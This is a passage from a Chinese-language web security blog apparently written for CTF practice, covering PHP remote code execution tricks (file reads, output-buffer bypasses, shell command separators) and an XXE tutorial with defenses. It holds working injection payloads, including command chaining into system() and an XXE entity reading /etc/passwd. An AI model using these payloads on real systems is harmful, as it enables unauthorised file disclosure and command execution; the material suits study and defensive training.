<h2 id="7-5-readgzfile函数文件读取"><a href="#7-5-readgzfile函数文件读取" class="headerlink" title="7.5 readgzfile函数文件读取"></a>7.5 readgzfile函数文件读取</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c=readgzfile(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">c=readgzfile(<span class="string">&quot;../../../../../flag.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">c=readgzfile(<span class="string">&quot;/flag.txt&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="7-6-require-once函数文件读取"><a href="#7-6-require-once函数文件读取" class="headerlink" title="7.6 require_once函数文件读取"></a>7.6 require_once函数文件读取</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=require_once(<span class="string">&#x27;/flag.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="7-7-函数嵌套文件枚举"><a href="#7-7-函数嵌套文件枚举" class="headerlink" title="7.7 函数嵌套文件枚举"></a>7.7 函数嵌套文件枚举</h2><p>​<code>getcwd()</code>​ 函数返回当前工作目录的路径。<br>​<code>scandir()</code>​ 函数列出指定目录中的所有文件和目录，并返回一个包含文件和目录名称的数组。<br>​<code>show_source()</code>​ 函数用于显示一个 PHP 文件的源代码<br>通过这三个函数，拼接出了flag.php文件，并使用<code>show_source</code>​输出。这里的<code>[2]</code>​要多尝试，flag文件的位置不一定会在第2位</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=show_source(scandir(getcwd())[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure>

<h2 id="7-8-函数嵌套文件读取"><a href="#7-8-函数嵌套文件读取" class="headerlink" title="7.8 函数嵌套文件读取"></a>7.8 函数嵌套文件读取</h2><p>这个函数拼接实际上是上面的复杂版，适用于<code>[]</code>​被过滤的情况，不能直接遍历<code>scandir</code>​数组，只能使用指针操作来获取特定文件，由于前两个文件是<code>.</code>​和<code>..</code>​，因此用<code>array_reverse</code>​函数从最后一个文件开始。由于指针操作函数的作用是返回值而非地址，因此不能嵌套使用，利用这种方式只能读取很有限的几个文件。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">读取最后一个文件</span><br><span class="line">c=show_source(current(array_reverse(scandir(getcwd()))));</span><br><span class="line">读取倒数第二个元素</span><br><span class="line">c=show_source(next(array_reverse(scandir(getcwd()))));</span><br></pre></td></tr></table></figure>

<p>还可以用下面的这个函数实现同样功能</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=echo highlight_file(current(array_reverse(scandir(pos(localeconv())))));</span><br><span class="line">c=echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>

<h1 id="八-缓冲区劫持"><a href="#八-缓冲区劫持" class="headerlink" title="八. 缓冲区劫持"></a>八. 缓冲区劫持</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>当我们利用函数与命令对目录与文件进行读取时，获得的内容会被输出到缓冲区，但并没有立即发送到浏览器。<br>而本段代码中<code>ob_get_contents()</code>​ 获取当前输出缓冲区的内容（如果有的话），然后通过 <code>ob_end_clean()</code>​ 清空缓冲区。这些代码意味着，如果 PHP 代码执行过程中有任何输出，它将被捕获到变量 <code>$s</code>​ 中。然后通过对<code>$s</code>​的正则匹配将输出全部替换为<code>?</code>​，使我们无法获得flag。</p>
<h2 id="8-1-提前送出缓冲区"><a href="#8-1-提前送出缓冲区" class="headerlink" title="8.1 提前送出缓冲区"></a>8.1 提前送出缓冲区</h2><p>​<code>ob_flush()</code>​ 是用来将缓冲区的内容立即输出到浏览器，但它并不会改变缓冲区中的内容。<br>​<code>ob_end_flush()</code>​ 是用来将缓冲区的内容立即输出到浏览器，并清空缓冲区的内容。<br>利用这两个函数，可以在执行后续缓冲区操作前提前把内容输出<br>(这里的&#x2F;flag.txt是在根目录下的文件)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">c=var_export(glob(<span class="string">&#x27;*&#x27;</span>));ob_flush();</span><br><span class="line">c=var_export(scandir(<span class="string">&#x27;/&#x27;</span>));ob_flush();</span><br><span class="line"></span><br><span class="line">c=include(<span class="string">&#x27;/flag.txt&#x27;</span>);ob_flush();</span><br><span class="line">c=include(<span class="string">&#x27;/flag.txt&#x27;</span>);ob_end_flush();</span><br><span class="line">c=readgzfile(<span class="string">&quot;/flag.txt&quot;</span>);ob_flush();</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h2 id="8-2-提前终止程序"><a href="#8-2-提前终止程序" class="headerlink" title="8.2 提前终止程序"></a>8.2 提前终止程序</h2><p>如果在脚本结束时（比如在 <code>exit()</code>​ <code>die()</code>​被调用时），输出缓冲区中还有未输出的内容，PHP 会自动刷新这些内容并将其输出到浏览器。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">c=var_export(scandir(<span class="string">&#x27;/&#x27;</span>));<span class="built_in">exit</span>();</span><br><span class="line">c=var_export(scandir(<span class="string">&#x27;/&#x27;</span>));die();</span><br><span class="line"></span><br><span class="line">c=include(<span class="string">&#x27;/flag.txt&#x27;</span>);<span class="built_in">exit</span>();</span><br><span class="line">c=include(<span class="string">&#x27;/flag.txt&#x27;</span>);die();</span><br><span class="line">c=readgzfile(<span class="string">&quot;/flag.txt&quot;</span>);die();</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h1 id="九-命令分隔符"><a href="#九-命令分隔符" class="headerlink" title="九. 命令分隔符"></a>九. 命令分隔符</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    </span><br><span class="line">	<span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];    </span><br><span class="line">	<span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);   </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;    </span><br><span class="line">	<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里解释一下这个</p>
<ul>
<li><p>​<code>&gt;/dev/null 2&gt;&amp;1</code>​ 是一个 Linux Shell 重定向操作：</p>
<ul>
<li>​<code>&gt;/dev/null</code>​：将标准输出重定向到 <code>/dev/null</code>​，相当于丢弃输出。</li>
<li>​<code>2&gt;&amp;1</code>​：将标准错误（<code>2</code>​）重定向到标准输出（<code>1</code>​），也一起丢弃。</li>
</ul>
</li>
<li><p>这意味着任何命令的输出（包括结果与报错）都不会显示。</p>
</li>
</ul>
<h2 id="9-1-​-​-​-​-0a​命令分隔"><a href="#9-1-​-​-​-​-0a​命令分隔" class="headerlink" title="9.1 ;​,||​,&amp;​,&amp;&amp;​ %0a​命令分隔"></a>9.1 <code>;</code>​,<code>||</code>​,<code>&amp;</code>​,<code>&amp;&amp;</code>​ <code>%0a</code>​命令分隔</h2><p>先来看一下这几个字符的作用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">; <span class="comment">//分号，前面的命令被执行，后面的命令和&gt;/dev/null 2&gt;&amp;1拼接被丢弃  </span></span><br><span class="line">| <span class="comment">//只执行后面那条命令  </span></span><br><span class="line">|| <span class="comment">//只执行前面那条命令  </span></span><br><span class="line">&amp; <span class="comment">//两条命令分别执行  </span></span><br><span class="line">&amp;&amp; <span class="comment">//仅当前一条命令成功执行后才执行下一条命令</span></span><br><span class="line">%<span class="number">0</span>a <span class="comment">//在URL编码中代表换行符，可以分隔或中断正常的指令</span></span><br></pre></td></tr></table></figure>

<p>于是构造以下Payloads。需要注意的是<code>&amp;</code>​ 在 <strong>URL</strong> 中是一个保留字符，其作用是分隔多个参数，因此不能直接用 <code>&amp;</code>​ 而必须用 <code>%26</code>​。此处仅示例最基础命令，其他命令同理</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">?c=ls;ls</span><br><span class="line">?c=tac flag.php;ls</span><br><span class="line"></span><br><span class="line">?c=ls||</span><br><span class="line">?c=tac flag.php||  </span><br><span class="line"></span><br><span class="line">?c=ls%<span class="number">26</span></span><br><span class="line">?c=tac flag.php%<span class="number">26</span>  </span><br><span class="line"></span><br><span class="line">?c=ls%<span class="number">26</span>%<span class="number">26</span></span><br><span class="line">?c=tac flag.php%<span class="number">26</span>%<span class="number">26</span> </span><br><span class="line"></span><br><span class="line">?c=ls%<span class="number">0</span>A</span><br><span class="line">?c=tac flag.php%<span class="number">0</span>A</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/05/20/Web/RCE%EF%BC%88%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%89/" data-id="cmaxy8gbi0009kg7kgjfk9m1e" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-Web/XXE（XML外部实体注入）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/05/20/Web/XXE%EF%BC%88XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%EF%BC%89/" class="article-date">
  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="XXE（XML外部实体注入）"><a href="#XXE（XML外部实体注入）" class="headerlink" title="XXE（XML外部实体注入）"></a>XXE（XML外部实体注入）</h1><h2 id="XXE是什么？"><a href="#XXE是什么？" class="headerlink" title="XXE是什么？"></a>XXE是什么？</h2><blockquote>
<p><strong>XXE（XML外部实体注入）</strong> 是一种针对应用程序<strong>处理XML数据</strong>的方式的攻击。在这种攻击中，攻击者<strong>利用应用程序</strong>对<strong>XML输入</strong>的<strong>处理不当</strong>，<strong>引入或“注入”</strong> 恶意内容。这可能<strong>导致未授权的数据访问、服务拒绝攻击甚至执行远程代码</strong>。</p>
</blockquote>
<p><img src="/.com//75546efaeffc13568dbf8842e9ee9cff-20250422220641-6fmtypu.png" alt="75546efaeffc13568dbf8842e9ee9cff">​</p>
<h2 id="XXE漏洞原理"><a href="#XXE漏洞原理" class="headerlink" title="XXE漏洞原理"></a>XXE漏洞原理</h2><blockquote>
<p>&#x3D;&#x3D;XML（可扩展标记语言）&#x3D;&#x3D;是一种常用于Web应用程序的数据格式。XML文档可以&#x3D;&#x3D;定义实体&#x3D;&#x3D;，它们是存储文档中其他地方重复使用的数据的方式。外部实体是一种特殊类型的实体，它们的内容被定义在XML文档外部。</p>
<p>XXE漏洞发生在当应用程序解析含有外部实体引用的XML文档时，没有正确地限制或禁止这些外部实体的使用。攻击者可以利用这一点，通过构造包含恶意外部实体的XML文档，来实现攻击目的。</p>
</blockquote>
<h2 id="XXE漏洞案例讲解"><a href="#XXE漏洞案例讲解" class="headerlink" title="XXE漏洞案例讲解"></a>XXE漏洞案例讲解</h2><h3 id="案例：读取服务器文件"><a href="#案例：读取服务器文件" class="headerlink" title="案例：读取服务器文件"></a>案例：读取服务器文件</h3><ul>
<li><strong>场景</strong>：一个Web应用程序允许用户上传XML文件来更新个人配置。</li>
<li><strong>攻击方法</strong>：攻击者创建一个XML文件，其中包含一个外部实体，该实体引用了服务器上的敏感文件（例如<code>/etc/passwd</code>​）。</li>
</ul>
<p><strong>XML示例</strong>：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>结果</strong>：当服务器处理此XML文件时，外部实体<code>xxe</code>​被解析，导致<code>/etc/passwd</code>​文件的内容被插入到XML文档中，并返回给攻击者。</p>
<p><img src="/.com//d93dbb9792be3727da5e6a2d56d6f996-20250422222618-5n0s782.png" alt="d93dbb9792be3727da5e6a2d56d6f996">​</p>
<h5 id="漏洞利用影响"><a href="#漏洞利用影响" class="headerlink" title="漏洞利用影响"></a>漏洞利用影响</h5><ul>
<li>攻击者可以读取服务器上的任意文件，这可能导致敏感信息泄露。</li>
<li>在某些情况下，攻击者还可以利用XXE漏洞发起服务拒绝（DoS）攻击，甚至执行远程代码。</li>
</ul>
<h4 id="防御策略"><a href="#防御策略" class="headerlink" title="防御策略"></a>防御策略</h4><ul>
<li><strong>禁用外部实体</strong>：在解析XML时禁用外部实体的处理。</li>
<li><strong>限制XML解析器功能</strong>：配置XML解析器，以最小化处理不必要功能，例如禁用DTD（文档类型定义）。</li>
<li><strong>输入验证</strong>：对输入的XML数据进行严格的验证，确保没有恶意构造的内容。</li>
<li><strong>错误处理</strong>：确保错误处理机制不会泄露敏感信息。</li>
</ul>
<p><img src="/.com//d93dbb9792be3727da5e6a2d56d6f996-20250422222618-5n0s782.png" alt="dc7b47612a2ffd945abc66ff52d915f7"></p>
<h4 id="XXE-的危害"><a href="#XXE-的危害" class="headerlink" title="XXE 的危害"></a>XXE 的危害</h4><ol>
<li><p><strong>敏感数据泄露</strong>：</p>
<ul>
<li>XXE攻击可以使攻击者读取服务器上的文件，包括配置文件、源代码、密码文件等，从而泄露敏感信息。</li>
</ul>
</li>
<li><p><strong>内部系统扫描</strong>：</p>
<ul>
<li>攻击者可以利用XXE攻击探测内部网络，识别内部服务和应用，从而为进一步的攻击提供信息。</li>
</ul>
</li>
</ol>
<ul>
<li><p><strong>服务器端请求伪造（SSRF）</strong> ：</p>
<ul>
<li>通过XXE攻击，攻击者可能能够迫使服务器与内部系统或外部服务器进行交互，可能导致数据泄露或其他安全问题。</li>
</ul>
</li>
<li><p><strong>执行远程代码和命令</strong>：</p>
<ul>
<li>在某些情况下，特别是当解析器支持强大的功能时，XXE攻击可以用于执行远程代码或系统命令，从而完全控制受影响的服务器。</li>
</ul>
</li>
<li><p><strong>拒绝服务攻击（DoS）</strong> ：</p>
<ul>
<li>XXE攻击可以用于发起拒绝服务攻击，例如通过指向大量消耗资源的外部实体或构造庞大的XML文档来耗尽服务器资源。</li>
</ul>
</li>
<li><p><strong>绕过防火墙</strong>：</p>
<ul>
<li>攻击者可以利用XXE漏洞绕过直接从外部网络访问内部网络资源的限制。</li>
</ul>
</li>
<li><p><strong>植入恶意内容</strong>：</p>
<ul>
<li>在某些情况下，XXE漏洞可以被用来植入恶意内容到系统中，影响数据的完整性。</li>
</ul>
</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/05/20/Web/XXE%EF%BC%88XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%EF%BC%89/" data-id="cmaxy8gbj000akg7kflpsdoee" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Web/">Web</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Web/HTTP%E6%95%99%E7%A8%8B/">HTTP教程</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/PHP%E5%AE%89%E5%85%A8/">PHP安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/XSS/">XSS</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">注入漏洞</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a></li></ul></li></ul></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSRF/" rel="tag">CSRF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF%E9%A2%98%E7%9B%AE/" rel="tag">CTF题目</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Content-Type/" rel="tag">Content-Type</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTP/" rel="tag">HTTP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTPS/" rel="tag">HTTPS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSTI/" rel="tag">SSTI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/" rel="tag">XSS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSStrike/" rel="tag">XSStrike</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/labs/" rel="tag">labs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%9E%E6%88%98/" rel="tag">实战</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/" rel="tag">对象注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" rel="tag">报错注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" rel="tag">数据库</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" rel="tag">模板注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/" rel="tag">比较漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" rel="tag">网络协议</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/" rel="tag">跨站脚本</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/CSRF/" style="font-size: 10px;">CSRF</a> <a href="/tags/CTF%E9%A2%98%E7%9B%AE/" style="font-size: 10px;">CTF题目</a> <a href="/tags/Content-Type/" style="font-size: 10px;">Content-Type</a> <a href="/tags/HTTP/" style="font-size: 13.33px;">HTTP</a> <a href="/tags/HTTPS/" style="font-size: 10px;">HTTPS</a> <a href="/tags/PHP/" style="font-size: 16.67px;">PHP</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 13.33px;">SQL注入</a> <a href="/tags/SSTI/" style="font-size: 10px;">SSTI</a> <a href="/tags/XSS/" style="font-size: 20px;">XSS</a> <a href="/tags/XSStrike/" style="font-size: 10px;">XSStrike</a> <a href="/tags/labs/" style="font-size: 10px;">labs</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 13.33px;">反序列化</a> <a href="/tags/%E5%AE%89%E5%85%A8/" style="font-size: 13.33px;">安全</a> <a href="/tags/%E5%AE%9E%E6%88%98/" style="font-size: 10px;">实战</a> <a href="/tags/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">对象注入</a> <a href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">报错注入</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 10px;">数据库</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">比较漏洞</a> <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 10px;">渗透测试</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" style="font-size: 10px;">网络协议</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="font-size: 10px;">网络安全</a> <a href="/tags/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/" style="font-size: 10px;">跨站脚本</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/05/">May 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/05/">May 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/04/">April 2024</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/xsstrike/">(no title)</a>
          </li>
        
          <li>
            <a href="/2025/05/20/Web/%E7%BB%95%E8%BF%87/%E7%BB%95%E8%BF%87/">(no title)</a>
          </li>
        
          <li>
            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/">(no title)</a>
          </li>
        
          <li>
            <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B/">(no title)</a>
          </li>
        
          <li>
            <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%20stacked%20%20injection/">(no title)</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2025 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>